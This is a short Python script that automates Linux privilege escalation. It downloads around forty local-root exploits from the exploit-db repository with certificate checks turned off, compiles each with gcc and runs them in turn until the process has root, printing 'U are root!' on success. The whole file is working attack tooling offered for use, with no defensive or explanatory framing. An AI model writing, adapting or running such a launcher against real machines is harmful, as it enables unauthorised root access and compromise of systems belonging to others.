# -*- coding: utf-8 -*-

import os

download_place = 'https://raw.githubusercontent.com/offensive-security/exploitdb/master/exploits/linux/local/'

exploit_files = {
    '2031.c': '-static -Wall',
    '17391.c': '',
    '18411.c': '',
    '33321.c': '',
    '35161.c': '',
    '5092.c': '',
    '8572.c': '',
    '25202.c': '',
    '33322.c': '',
    '40812.c': '',
    '37292.c': '',
    '2013.c': '',
    '5093.c': '',
    '8673.c': '',
    '10613.c': '',
    '40003.c': '',
    '2004.c': '',
    '15704.c': '',
    '25444.c': '',
    '30604.c': '',
    '33824.c': '',
    '41994.c': '',
    '2005.c': '',
    '15285.c': '',
    '41995.c': '',
    '2006.c': '',
    '40616.c': '',
    '33336.c': '',
    '39166.c': '',
    '41886.c': '',
    '1397.c': '',
    '27297.c': '',
    '39277.c': '',
    '718.c': '',
    '8678.c': '',
    '41458.c': '',
    '40839.c': '',
    '35370.c': '',
    '38390.c': '',
    '39230.c': '',
    '42183.c': ''
    }

def gcc(options, name):
    os.system('gcc ' + options + ' ' + name + ' -o ' + name[:-2])

def download_exploits():
    if os.path.exists("exploits"):
        pass
    else:
        os.mkdir('exploits')
    for fil in exploit_files.keys():
        os.system('wget --no-check-certificate ' + download_place + fil + ' -O exploits/' + fil)

def build_exploits():
    os.chdir('exploits')
    for fil in exploit_files.keys():
            gcc(exploit_files[fil], fil)
            
def run_exploits():
    for fil in exploit_files.keys():
        os.system('./' + fil[:-2])
        if os.geteuid() == 0:
            exit('U are root!')
        else:
            print('Exploit ' + fil + ' failed')
            
            

if __name__ == '__main__':
    download_exploits()
    build_exploits()
    run_exploits()
    exit('Mission failed(((')
